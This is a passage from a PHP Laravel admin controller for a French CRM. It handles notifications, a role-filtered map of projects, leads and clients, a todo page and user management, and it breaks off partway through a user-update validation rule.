    public function allNotifications(){ 
        return view('admin.notifications');
    }

    // Delete Notification 
    public function notificationDelete(Request $request){

        Notifications::findOrFail($request->id)->delete();

        return back()->with('success', __('Notification Deleted Successfully'));
 
    }

    // Unread Notification 
    public function notificationUnread(Request $request){
        $notification = Notifications::findOrFail($request->id);
        $notification->status = '0';
        $notification->save();
        return back();

    }

    // Read Notification 
    public function notificationRead(Request $request){
        $notification = Notifications::findOrFail($request->id);
        $notification->status = '1';
        $notification->save();
        return back();

    }
    public function notificationsReadAll(Request $request){
        $notifications = Notifications::where('user_id', Auth::id())->get();
        if($notifications->count() > 0){
            foreach($notifications as $notification){
                $notification->status = '1';
                $notification->save();
            }
        }
        return back();
    }

    // Notification Status 
    public function notificationStatusChange(Request $request){
        $x_status = NotificationStatus::where('user_id', Auth::id())->where('module_name', $request->module_name)->first();
        if($x_status){
            $x_status->delete();
        }
        NotificationStatus::create($request->except('_token') + ['user_id' => Auth::id()]);
        return response(__('Updated Successfully'));
    }


    // not permission page 
    public function notPermitted(){

        return view('admin.not-permitted');
    }


    // Map Page 
    public function mapPage(){

        $statuses       = [];
        $sub_statuses   = [];
        $statuses2       = [];
        $sub_statuses2   = [];
        $roles          = Role::findMany([2,4,6,9]);
        $all_users      = User::where('deleted_status', 'no')->where('status', 'active')->get(); 
        $problems   = TicketProblemStatus::all();
        $week_start = Carbon::now()->startOfWeek()->format('Y-m-d');
        $week_end  = Carbon::now()->endOfWeek()->format('Y-m-d'); 
        
        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        if(in_array(role(), $administrarif_role)){
            $filter_telecommercial_status = true;
            $all_projects = NewProject::whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
        }else{
            $filter_telecommercial_status = false;
            if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                $stats_regies = Auth::user()->allRegie; 
                $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                $all_projects = NewProject::whereIn('project_telecommercial', $user_ids)->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
            }else if(role() == 'team_leader'){
                $team_users = Auth::user()->getTeamUsers;
                $intervention_project_ids = ProjectIntervention::whereIn('user_id', $team_users->pluck('id'))->whereIn('type', ['Installation', 'SAV', 'Déplacement', 'Contre Visite Technique'])->pluck('project_id')->toArray();
                $all_projects = NewProject::whereIn('id', $intervention_project_ids)->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
            }else{
                if(role() == 'telecommercial' || role() == 'telecommercial_externe'){
                    $all_projects = Auth::user()->getTelecommiercialProjects()->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
                }else{
                    $intervention_project_ids = ProjectIntervention::where('user_id', Auth::id())->pluck('project_id')->toArray();
                    $all_projects = NewProject::whereIn('id', $intervention_project_ids)->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
                } 
            }
        }


        $projects   = $all_projects->map(function ($project){
            return [
                'id'            => $project->id,
                'Nom'           => $project->Nom,
                'Prenom'        => $project->Prenom, 
                'Code_Postal'   => $project->Code_Postal, 
                'tag'           => implode(',', $project->ProjectTravauxTags->pluck('tag')->toArray()),
            ];
        });

        $items = [];
        // $items = $all_projects->map(function ($item){
        //     return [
        //         'id'            => $item->id,
        //         'Nom'           => $item->Nom,
        //         'Prenom'        => $item->Prenom, 
        //         'Département'   => $item->Département, 
        //         'phone'         => $item->phone, 
        //         'tag'           => $item->ProjectTravauxTags()->count() > 0 ? implode(',', $item->ProjectTravauxTags->pluck('tag')->toArray()) : '',
        //         'latitude'      => $item->latitude, 
        //         'longitude'     => $item->longitude, 
        //         'color'         => $item->getSubStatus->background_color ?? '#8e27b3', 
        //     ];
        // }); 
        // $users = User::whereNotNull('lat_address')->get();  
        return view('admin.map', compact('items', 'statuses', 'sub_statuses', 'statuses2', 'sub_statuses2', 'roles', 'all_users', 'projects', 'problems', 'week_start', 'week_end'));
    }
    public function mapPageOld($status = null){
        $data = ProjectAssign::where('user_id', Auth::id())->get()->pluck('project_id');
        $filtered = '';
        if($status){        
            $filtered = 'yes';
            if($status == 'ALL'){
                if(role() == 's_admin'){
                    $projects = Project::where('deleted_status', 'no')->get();
                }
                else{
                    $projects = Project::whereIn('id', $data)->where('deleted_status', 'no')->get();
                }
            }else{
                if(role() == 's_admin'){
                    $projects = Project::where('status', $status)->where('deleted_status', 'no')->get(); 
                }else{
                    $projects = Project::whereIn('id', $data)->where('status', $status)->where('deleted_status', 'no')->get(); 
                }
            }
        }
        else{
            $filtered = 'no';
            if(role() == 's_admin'){
                $projects = Project::where('deleted_status', 'no')->get();
            }
            else{
                $projects = Project::whereIn('id', $data)->where('deleted_status', 'no')->get();
            }
        }
        $id = DB::table('personal_access_tokens')->get()->pluck('tokenable_id');
        $users  = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('id',$id)->whereNotNull('lat_address')->get();
        // $users = User::whereNotNull('lat_address')->get();  
        return view('admin.map', compact('projects', 'users', 'filtered'));
    }

    // Map Filter 

    public function mapFilter(){
        $all_users  = User::where('deleted_status', 'no')->where('status', 'active')->get();
        $roles      = Role::findMany([2,4,6,9]);
        $problems   = TicketProblemStatus::all(); 
        $week_start = Carbon::now()->startOfWeek()->format('Y-m-d');
        $week_end  = Carbon::now()->endOfWeek()->format('Y-m-d'); 

        $items_1 = [];
        $items_2 = [];
        $items_3 = [];

        $statuses = [];
        $sub_statuses = [];
        $statuses2 = [];
        $sub_statuses2 = [];

        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        if(in_array(role(), $administrarif_role)){
            $filter_telecommercial_status = true;
            $all_projects = NewProject::whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
        }else{
            $filter_telecommercial_status = false;
            if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                $stats_regies = Auth::user()->allRegie; 
                $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                $all_projects = NewProject::whereIn('project_telecommercial', $user_ids)->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
            }else if(role() == 'team_leader'){
                $team_users = Auth::user()->getTeamUsers;
                $intervention_project_ids = ProjectIntervention::whereIn('user_id', $team_users->pluck('id'))->whereIn('type', ['Installation', 'SAV', 'Déplacement', 'Contre Visite Technique'])->pluck('project_id')->toArray();
                $all_projects = NewProject::whereIn('id', $intervention_project_ids)->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
            }else{
                if(role() == 'telecommercial' || role() == 'telecommercial_externe'){
                    $all_projects = Auth::user()->getTelecommiercialProjects()->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
                }else{
                    $intervention_project_ids = ProjectIntervention::where('user_id', Auth::id())->pluck('project_id')->toArray();
                    $all_projects = NewProject::whereIn('id', $intervention_project_ids)->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
                } 
            }
        }

        $projects   = $all_projects->map(function ($project){
            return [
                'id'            => $project->id,
                'Nom'           => $project->Nom,
                'Prenom'        => $project->Prenom, 
                'Code_Postal'   => $project->Code_Postal, 
                'tag'           => implode(',', $project->ProjectTravauxTags->pluck('tag')->toArray()),
            ];
        }); 

        if(request()->type == 'chantier' || request()->type2 == 'chantier'){ 

            $item_1 = NewProject::query(); 
            $item_2 = NewProject::query(); 
            $item_3 = NewProject::query(); 
            $item_4 = NewProject::query(); 
            if(!in_array(role(), $administrarif_role)){ 
                if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                    $stats_regies = Auth::user()->allRegie; 
                    $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                    $item_1->whereIn('project_telecommercial', $user_ids);
                    $item_2->whereIn('project_telecommercial', $user_ids);
                    $item_3->whereIn('project_telecommercial', $user_ids);
                    $item_4->whereIn('project_telecommercial', $user_ids);
                }else if(role() == 'team_leader'){
                    $team_users = Auth::user()->getTeamUsers;
                    $intervention_project_ids = ProjectIntervention::whereIn('user_id', $team_users->pluck('id'))->whereIn('type', ['Installation', 'SAV', 'Déplacement', 'Contre Visite Technique'])->pluck('project_id')->toArray();
                    $item_1->whereIn('id', $intervention_project_ids);
                    $item_2->whereIn('id', $intervention_project_ids);
                    $item_3->whereIn('id', $intervention_project_ids);
                    $item_4->whereIn('id', $intervention_project_ids);
                }else{
                    if(role() == 'telecommercial' || role() == 'telecommercial_externe'){
                        $item_1->where('project_telecommercial', Auth::id());
                        $item_2->where('project_telecommercial', Auth::id());
                        $item_3->where('project_telecommercial', Auth::id());
                        $item_4->where('project_telecommercial', Auth::id());
                    }else{
                        $intervention_project_ids = ProjectIntervention::where('user_id', Auth::id())->pluck('project_id')->toArray(); 
                        $item_1->whereIn('id', $intervention_project_ids);
                        $item_2->whereIn('id', $intervention_project_ids);
                        $item_3->whereIn('id', $intervention_project_ids);
                        $item_4->whereIn('id', $intervention_project_ids);
                    } 
                }
            }

            // $item = NewProject::query();
            if(request()->type == 'chantier'){
                if(request()->label){
                    // $item_1->where('project_label', request()->label);
                    // $item_2->where('project_label', request()->label);
                    // $item_3->where('project_label', request()->label);
                    $item_4->where('project_label', request()->label);

                    

                    $label = ProjectNewStatus::find(request()->label);
                    if($label){
                        $sub_statuses = $label->getSubStatus;
                    } 
                }
                if(request()->status){
                    // $item_1->whereIn('project_sub_status', request()->status);
                    // $item_2->whereIn('project_sub_status', request()->status);
                    // $item_3->whereIn('project_sub_status', request()->status);
                    $item_4->whereIn('project_sub_status', request()->status);
                }

                $statuses = ProjectNewStatus::orderBy('order', 'asc')->get();
            }else if(request()->type2 == 'chantier'){
                if(request()->label2){
                    // $item_1->where('project_label', request()->label2);
                    // $item_2->where('project_label', request()->label2);
                    // $item_3->where('project_label', request()->label2);
                    $item_4->where('project_label', request()->label2);

                    $label = ProjectNewStatus::find(request()->label2);
                    if($label){
                        $sub_statuses2 = $label->getSubStatus;
                    } 
                }
                if(request()->status2){
                    // $item_1->whereIn('project_sub_status', request()->status2);
                    // $item_2->whereIn('project_sub_status', request()->status2);
                    // $item_3->whereIn('project_sub_status', request()->status2);
                    $item_4->whereIn('project_sub_status', request()->status2);
                }
                $statuses2 = ProjectNewStatus::orderBy('order', 'asc')->get();
            }

            $final_filter = $item_4->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();

            if(request()->user){
                if(request()->custom_filter_date){
                    $week_start = Carbon::parse(request()->custom_filter_date)->startOfWeek()->format('Y-m-d');
                    $week_end  = Carbon::parse(request()->custom_filter_date)->endOfWeek()->format('Y-m-d');  
                    $project_id = ProjectIntervention::whereBetween('Date_intervention', [$week_start, $week_end])->where('user_id', request()->user)->pluck('project_id'); 
                }else{
                    $project_id = ProjectIntervention::where('user_id', request()->user)->pluck('project_id'); 
                }
                $filter1 = $item_1->whereIn('id', $project_id)->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
                $final_filter = $final_filter->merge($filter1);
            }
            if(request()->ticket_type){
                $ticket = Ticketing::query();
                $ticket->where('ticket_type', request()->ticket_type);
                if(request()->ticket_status){
                    if(request()->ticket_status == 'Ouvert'){
                        $ticket->whereNull('close_at');
                    }else{
                        $ticket->whereNotNull('close_at');
                    }
                }
                if(request()->problem_type){
                    $ticket->where('problem_id', request()->problem_type);
                }

                $ticket_project_id = $ticket->pluck('project_id');
                $filter2 = $item_2->whereIn('id', $ticket_project_id)->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
                $final_filter = $final_filter->merge($filter2);
                
            }

            if(session('filter-card-client') == 'active' && request()->project){
                $fitler3 = $item_3->whereIn('id', request()->project)->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
                $final_filter = $final_filter->merge($fitler3);
            }
            $items_1 = $final_filter->map(function ($item){
                return [
                    'id'            => $item->id,
                    'Nom'           => $item->Nom,
                    'Prenom'        => $item->Prenom, 
                    'Département'   => $item->Département, 
                    'phone'         => $item->phone, 
                    'tag'           => implode(',', $item->ProjectTravauxTags->pluck('tag')->toArray()),
                    'latitude'      => $item->latitude, 
                    'longitude'     => $item->longitude, 
                    'color'         => $item->getSubStatus->background_color ?? '#8e27b3', 
                    'status'        => $item->projectStatus->status ?? '',
                    'sub_status'    => $item->getSubStatus->name ?? '',
                    'type'          => 'project'
                ];
            })->toArray();
        }
        if(request()->type == 'prospect' || request()->type2 == 'prospect'){
            $item = LeadClientProject::query();
            if(!in_array(role(), $administrarif_role)){    
                if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                    $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                    $telecommercials = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->get();
                    $item->whereIn('lead_telecommercial', $user_ids);
                }else{
                    $item->where('lead_telecommercial', Auth::id());
                } 
            } 
            if(request()->type == 'prospect'){
                if(request()->label){
                    $item->where('lead_label', request()->label);
                    $label = LeadStatus::find(request()->label);
                    if($label){
                        $sub_statuses = $label->getSubStatus;
                    }
                }
                if(request()->status){
                    $item->whereIn('sub_status', request()->status);
                }
                $statuses = LeadStatus::all();
            }else if(request()->type2 == 'prospect'){
                if(request()->label2){
                    $item->where('lead_label', request()->label2);
                    $label = LeadStatus::find(request()->label2);
                    if($label){
                        $sub_statuses2 = $label->getSubStatus;
                    }
                }
                if(request()->status2){
                    $item->whereIn('sub_status', request()->status2);
                }
                $statuses2 = LeadStatus::all();
            }

            $items_2 = $item->whereNotNull('latitude')->where('lead_deleted_status', 0)->get()->map(function ($item){
                return [
                    'id'            => $item->id,
                    'Nom'           => $item->Nom,
                    'Prenom'        => $item->Prenom, 
                    'Département'   => $item->Département, 
                    'phone'         => $item->phone, 
                    'tag'           => $item->LeadTravaxTags()->count() > 0 ? implode(',', $item->LeadTravaxTags->pluck('tag')->toArray()) : '',
                    'latitude'      => $item->latitude, 
                    'longitude'     => $item->longitude, 
                    'color'         => $item->getSubStatus->background_color ?? '#8e27b3', 
                    'status'        => $item->getStatus->status ?? '',
                    'sub_status'    => $item->getSubStatus->name ?? '',
                    'type'          => 'lead'
                ];
            })->toArray(); 
        }
        if(request()->type == 'client' || request()->type2 == 'client'){
            $item = NewClient::query(); 

            if(!in_array(role(), $administrarif_role)){  
                if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                    $stats_regies = Auth::user()->allRegie; 
                    $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                    $client_telecommercial = NewClient::whereIn('client_telecommercial', $user_ids)->where('deleted_status', 0)->pluck('id');
                    $prospect_telecommercial = NewClient::whereIn('lead_telecommercial', $user_ids)->where('deleted_status', 0)->pluck('id');
                    $final_telecomemrcial = $client_telecommercial->merge($prospect_telecommercial);
                    $item->whereIn('id', $final_telecomemrcial);
                    // $client->whereIn('client_telecommercial', $user_ids);
                }else{
                    $item->where('lead_telecommercial', Auth::id())->orWhere('client_telecommercial', Auth::id());
                } 
            } 

            // if(request()->status){
            //     $item->where('sub_status', request()->status);
            // }

            $items_3 = $item->whereNotNull('latitude')->where('deleted_status', 0)->get()->map(function ($item){
                return [
                    'id'            => $item->id,
                    'Nom'           => $item->Nom,
                    'Prenom'        => $item->Prenom, 
                    'Département'   => $item->Département, 
                    'phone'         => $item->phone,  
                    'latitude'      => $item->latitude, 
                    'longitude'     => $item->longitude, 
                    'color'         => $item->getStatus->background_color ?? '#8e27b3',
                    'type'          => 'client'
                ];
            })->toArray();  
        }
        if(!request()->type && !request()->type2){

          
            $item1 = NewProject::query(); 
            $item2 = NewProject::query(); 
            $item3 = NewProject::query(); 
            if(!in_array(role(), $administrarif_role)){ 
                if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                    $stats_regies = Auth::user()->allRegie; 
                    $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                    $item1->whereIn('project_telecommercial', $user_ids);
                    $item2->whereIn('project_telecommercial', $user_ids);
                    $item3->whereIn('project_telecommercial', $user_ids);
                }else if(role() == 'team_leader'){
                    $team_users = Auth::user()->getTeamUsers;
                    $intervention_project_ids = ProjectIntervention::whereIn('user_id', $team_users->pluck('id'))->whereIn('type', ['Installation', 'SAV', 'Déplacement', 'Contre Visite Technique'])->pluck('project_id')->toArray();
                    $item1->whereIn('id', $intervention_project_ids);
                    $item2->whereIn('id', $intervention_project_ids);
                    $item3->whereIn('id', $intervention_project_ids);
                }else{
                    if(role() == 'telecommercial' || role() == 'telecommercial_externe'){
                        $item1->where('project_telecommercial', Auth::id());
                        $item2->where('project_telecommercial', Auth::id());
                        $item3->where('project_telecommercial', Auth::id());
                    }else{
                        $intervention_project_ids = ProjectIntervention::where('user_id', Auth::id())->pluck('project_id')->toArray(); 
                        $item1->whereIn('id', $intervention_project_ids);
                        $item2->whereIn('id', $intervention_project_ids);
                        $item3->whereIn('id', $intervention_project_ids);
                    } 
                }
            }


            if(request()->user){
                if(request()->custom_filter_date){
                    $week_start = Carbon::parse(request()->custom_filter_date)->startOfWeek()->format('Y-m-d');
                    $week_end  = Carbon::parse(request()->custom_filter_date)->endOfWeek()->format('Y-m-d');  
                    $project_id = ProjectIntervention::whereBetween('Date_intervention', [$week_start, $week_end])->where('user_id', request()->user)->pluck('project_id'); 
                }else{
                    $project_id = ProjectIntervention::where('user_id', request()->user)->pluck('project_id'); 
                }
                $filter1 = $item1->whereIn('id', $project_id)->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
            }
            if(request()->ticket_type){ 
                $ticket = Ticketing::query();
                $ticket->where('ticket_type', request()->ticket_type);
                if(request()->ticket_status){
                    if(request()->ticket_status == 'Ouvert'){
                        $ticket->whereNull('close_at');
                    }else{
                        $ticket->whereNotNull('close_at');
                    }
                }
                if(request()->problem_type){
                    $ticket->where('problem_id', request()->problem_type);
                }

                $ticket_project_id = $ticket->pluck('project_id');
                $filter2 = $item2->whereIn('id', $ticket_project_id)->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();
                
            }

            if(session('filter-card-client') == 'active' && request()->project){
                $fitler3 = $item3->whereIn('id', request()->project)->whereNotNull('latitude')->where('deleted_status', 0)->with('ProjectTravauxTags')->get();


            }

            if(request()->user && request()->ticket_type && (session('filter-card-client') == 'active' && request()->project)){
                $final_filter = $filter1->merge($filter2->merge($fitler3));
            }else if(request()->user && request()->ticket_type){
                $final_filter = $filter1->merge($filter2);
            }else if(request()->user && (session('filter-card-client') == 'active' && request()->project)){
                $final_filter = $filter1->merge($fitler3);
            }else if(request()->ticket_type && (session('filter-card-client') == 'active' && request()->project)){
                $final_filter = $filter2->merge($fitler3);
            }else if(request()->user){
                $final_filter = $filter1;
            }else if(request()->ticket_type){
                $final_filter = $filter2;
            }else if(session('filter-card-client') == 'active' && request()->project){
                $final_filter = $fitler3;
            }else{
                $final_filter = $item1->where('id', 0)->get();
            }

            $items = $final_filter->map(function ($item){
                return [
                    'id'            => $item->id,
                    'Nom'           => $item->Nom,
                    'Prenom'        => $item->Prenom, 
                    'Département'   => $item->Département, 
                    'phone'         => $item->phone, 
                    'tag'           => implode(',', $item->ProjectTravauxTags->pluck('tag')->toArray()),
                    'latitude'      => $item->latitude, 
                    'longitude'     => $item->longitude, 
                    'color'         => $item->getSubStatus->background_color ?? '#8e27b3', 
                    'status'        => $item->projectStatus->status ?? '',
                    'sub_status'    => $item->getSubStatus->name ?? '',
                    'type'          => 'project'
                ];
            });
        }else{
            $items = array_merge($items_1,$items_2,$items_3);
        }
        // dd($items);
        // dd(array_merge($items_1,$items_2,$items_3));
        return view('admin.map', compact('items', 'statuses', 'sub_statuses', 'statuses2', 'sub_statuses2', 'roles', 'all_users', 'problems', 'projects', 'week_start', 'week_end'));
    }

    public function mapFilterOld(){

        if(request()->zone == '')
        {
            $zone = ['H1', 'H2', 'H3'];
        }else{
            $zone = request()->zone;
        }
        if(request()->precariousness == '')
        {
            $precariousness = ['Classique', 'Intermediaire', 'Precaire', 'Grand Precaire'];
        }else{
            $precariousness = request()->precariousness;
        }

        if(request()->department == '')
        {
            $department = \App\Models\CRM\ZoneInfo::pluck('city');
        }else{
            $department = request()->department;
        }

        if(request()->status == '')
        {
            $status = getProjectStatusPlanning()->pluck('status');
        }else{
            $status = request()->status;
        }

        if(request()->projects == '')
        {
            $project_status = \App\Models\CRM\ProjectTableStatus::pluck('id')->toArray();
            array_push($project_status, 0); 
            
        }else{
            $project_status = request()->projects;
        }
        // ->whereIn('user_status', $project_status) 
        




        $data = ProjectAssign::where('user_id', Auth::id())->get()->pluck('project_id'); 
            $filtered = 'no';
            //  if(request()->projects){
            //     if(request()->project_no_status){
            //         if(role() == 's_admin'){
            //             $projects = Project::where('deleted_status', 'no')->whereIn('zone', $zone)->whereIn('city', $department)->whereIn('precariousness', $precariousness)->whereIn('status', $status)->whereIn('user_status', $project_status)->orWhereNull('user_status')->get();
            //         }
            //         else{
            //             $projects = Project::whereIn('id', $data)->where('deleted_status', 'no')->whereIn('zone', $zone)->whereIn('city', $department)->whereIn('precariousness', $precariousness)->whereIn('status', $status)->whereIn('user_status', $project_status)->orWhereNull('user_status')->get();
            //         } 
            //     }else{
            //         if(role() == 's_admin'){
            //             $projects = Project::where('deleted_status', 'no')->whereIn('zone', $zone)->whereIn('city', $department)->whereIn('precariousness', $precariousness)->whereIn('status', $status)->whereIn('user_status', $project_status)->get();
            //         }
            //         else{
            //             $projects = Project::whereIn('id', $data)->where('deleted_status', 'no')->whereIn('zone', $zone)->whereIn('city', $department)->whereIn('precariousness', $precariousness)->whereIn('status', $status)->whereIn('user_status', $project_status)->get();
            //         } 
            //     }
            //  }elseif(request()->project_no_status){
            //     if(role() == 's_admin'){
            //         $projects = Project::where('deleted_status', 'no')->whereIn('zone', $zone)->whereIn('city', $department)->whereIn('precariousness', $precariousness)->whereIn('status', $status)->whereNull('user_status')->get();
            //     }
            //     else{
            //         $projects = Project::whereIn('id', $data)->where('deleted_status', 'no')->whereIn('zone', $zone)->whereIn('city', $department)->whereIn('precariousness', $precariousness)->whereIn('status', $status)->whereNull('user_status')->get();
            //     } 
            //  }
            //  else{
                if(role() == 's_admin'){
                    $projects = Project::where('deleted_status', 'no')->whereIn('zone', $zone)->whereIn('city', $department)->whereIn('precariousness', $precariousness)->whereIn('status', $status)->whereIn('user_status', $project_status)->get();  

                }
                else{
                    $projects = Project::whereIn('id', $data)->where('deleted_status', 'no')->whereIn('zone', $zone)->whereIn('city', $department)->whereIn('precariousness', $precariousness)->whereIn('status', $status)->whereIn('user_status', $project_status)->get();
                } 
            //  }


            $travaux_filter = ''; 
            if(request()->travaux != '')
            {
                foreach(request()->travaux as $trauv)
                {
                    // $travaux_filter .= $trauv . ','; 
                    $works = Work::all(); 
                    $filtered_works = []; 
                    foreach($works as $work) 
                    {
                        if(str_contains($work->travaux, $trauv))
                        {
                            $filtered_works[] = $work->project_id;
                        }
                    }

                } 

                $ids = [];
                foreach($projects as $key => $project)
                {
                    foreach($filtered_works as $filtered_id)
                    {

                        if($project->id == $filtered_id)
                        {
                            $ids[] = $project->id;
                        }
                    }
                }

                $projects = Project::findMany($ids);
                // $trauv_projects = Project::findMany($filtered_works);
            
            }
            $product_filter = ''; 
            if(request()->product != '')
            {
                foreach(request()->product as $prod)
                { 
                    $workss = Work::all(); 
                    $filtered_workss = []; 
                    foreach($workss as $wrk) 
                    {
                        if(str_contains($wrk->product, $prod))
                        {
                            $filtered_workss[] = $wrk->project_id;
                        }
                    }

                } 

                $ids4 = [];
                foreach($projects as $key => $project)
                {
                    foreach($filtered_workss as $filter_id)
                    {

                        if($project->id == $filter_id)
                        {
                            $ids4[] = $project->id;
                        }
                    }
                }

                $projects = Project::findMany($ids4);
                // $trauv_projects = Project::findMany($filtered_works);
            
            }
           if(request()->client_status != ''){
               $client = Client::whereIn('user_status', request()->client_status)->pluck('id'); 
               $client_project = Project::whereIn('client_id', $client)->pluck('id'); 
               $ids2 = [];
               foreach($projects as $key => $project)
               {
                   foreach($client_project as $c_id)
                   {

                       if($project->id == $c_id)
                       {
                           $ids2[] = $project->id;
                       }
                   }
               }
               $projects = Project::findMany($ids2);
           }
            if(request()->lead_progress != ''){
                $leads1 = Lead::whereIn('user_status', request()->lead_progress)->where('status','in-progress')->pluck('id');
                $lead_project1 = Project::whereIn('lead_id', $leads1)->pluck('id'); 
                $ids4 = [];
                foreach($projects as $key => $project)
                {
                    foreach($lead_project1 as $l_id)
                    {
                        if($project->id == $l_id)
                        {
                            $ids4[] = $project->id;
                        }
                    }
                }
                $projects = Project::findMany($ids4);
            }
            if(request()->lead_prevalidate != ''){
                $leads2 = Lead::whereIn('user_status', request()->lead_prevalidate)->where('status','pre-validated')->pluck('id');
                $lead_project2 = Project::whereIn('lead_id', $leads2)->pluck('id'); 
                $ids5 = [];
                foreach($projects as $key => $project)
                {
                    foreach($lead_project2 as $l_id)
                    {
                        if($project->id == $l_id)
                        {
                            $ids5[] = $project->id;
                        }
                    }
                }
                $projects = Project::findMany($ids5);
            }
            if(request()->lead_checked != ''){
                $leads3 = Lead::whereIn('user_status', request()->lead_checked)->where('status','verified')->pluck('id');
                $lead_project3 = Project::whereIn('lead_id', $leads3)->pluck('id'); 
                $ids6 = [];
                foreach($projects as $key => $project)
                {
                    foreach($lead_project3 as $l_id)
                    {
                        if($project->id == $l_id)
                        {
                            $ids6[] = $project->id;
                        }
                    }
                }
                $projects = Project::findMany($ids6);
            }
        //    if(request()->lead_status != ''){
        //        $leads = Lead::whereIn('user_status', request()->lead_status)->pluck('id');
        //        $lead_project = Project::whereIn('lead_id', $leads)->pluck('id'); 
        //        $ids3 = [];
        //        foreach($projects as $key => $project)
        //        {
        //            foreach($lead_project as $l_id)
        //            {
        //                if($project->id == $l_id)
        //                {
        //                    $ids3[] = $project->id;
        //                }
        //            }
        //        }
        //        $projects = Project::findMany($ids3);
        //    }
               

            $id = DB::table('personal_access_tokens')->get()->pluck('tokenable_id');
            $users  = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('id',$id)->whereNotNull('lat_address')->get();

        return view('admin.map', compact('projects', 'users', 'filtered'));
    }

    // Todo Page 
    public function todoPage(){

        $users = User::where('deleted_status', 'no')->where('status', 'active')->get();
        $clients = Client::where('deleted_status', 'no')->get();
        $data = TaskAssign::where('assignee_id', Auth::id())->pluck('task_id'); 
        if(role() == 's_admin'){
            $tasks = Task::where('is_completed', 0)->where('is_pending', 0)->where('is_deleted', 0)->get();
            $complete_tasks = Task::where('is_completed', 1)->where('is_deleted', 0)->get();
            $important_tasks = Task::where('is_important', 1)->where('is_deleted', 0)->get();
            $pending_tasks = Task::where('is_pending', 1)->where('is_deleted', 0)->get();
            $deleted_tasks = Task::where('is_deleted', 1)->get();   
        }else{
            $tasks = Task::whereIn('id', $data)->where('is_completed', 0)->where('is_pending', 0)->where('is_deleted', 0)->get();
            $complete_tasks = Task::whereIn('id', $data)->where('is_completed', 1)->where('is_deleted', 0)->get();
            $important_tasks = Task::whereIn('id', $data)->where('is_important', 1)->where('is_deleted', 0)->get();
            $pending_tasks = Task::whereIn('id', $data)->where('is_pending', 1)->where('is_deleted', 0)->get();
            $deleted_tasks = Task::whereIn('id', $data)->where('is_deleted', 1)->get();   
        }
        $my_Task_count = $tasks->count();
        $important_Task_count = $important_tasks->count();
        $completed_Task_count = $complete_tasks->count();
        $pending_Task_count = $pending_tasks->count();
        $deleted_Task_count = $deleted_tasks->count();
        $tags = Tag::all();
        return view('admin.todo', compact('users', 'clients', 'tasks','complete_tasks','important_tasks', 'deleted_tasks', 'tags', 'pending_tasks', 'my_Task_count', 'important_Task_count', 'completed_Task_count', 'pending_Task_count', 'deleted_Task_count'));

    }

    // User List 
    public function UserList(){
        
        $headers = UserHeader::all();
        $filter_status = UserHeaderFilter::where('user_id', Auth::id())->orderBy('user_header_id', 'asc')->get();
        $users = User::where('deleted_status', 'no')->paginate(paginationNumber('users'));
        $roles = Role::where('status', 'active')->get();
        $regies = Regie::all();
        $team_leader = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 1)->get();
        return view('admin.user-list', compact('users', 'headers', 'filter_status', 'roles', 'regies', 'team_leader'));
    }

    // Update user 
    public function updateUser(Request $request){
        // $request->validate([
        //     // 'username'     => 'unique:users,username,'.$request->user_id,
        //     'email'         => 'unique:users,email,'.$request->user_id,
        // ],[
        //     // 'username.unique'   => __('This user name already exist'),
        //     'email.unique'      => __('This email address already exist'),
        // ]); 
        
        if($request->password){
            $request->validate([ 
                'name'              => 'required',
                'regie_id'          => 'required_with:regie',
                'team_leader'       => 'required_with:teamLeader',
                'email'             => 'required|email|unique:users,email,'.$request->user_id, 
                // 'username'          => 'required|unique:users',
                'password'          => 'regex:$\S*(?=\S{8,})(?=\S*[A-Z])(?=\S*[\W])\S*$',
                'confirm_password'  => 'same:password', 
                // 'email_professional'           => 'required',
                // 'phone_professional'           => 'required',
                // 'prenom_professional'           => 'required',
                'role_id'           => 'required',
                'photo'             => 'image'
            ],[
                'name.required'                 => __('Name is required'),
                'regie_id.required_with'        => __('Regie is required'),
                'team_leader.required_with'     => __('CHEF D’EQUIPE is required'),
                'email.required'                => __('Email is required'),
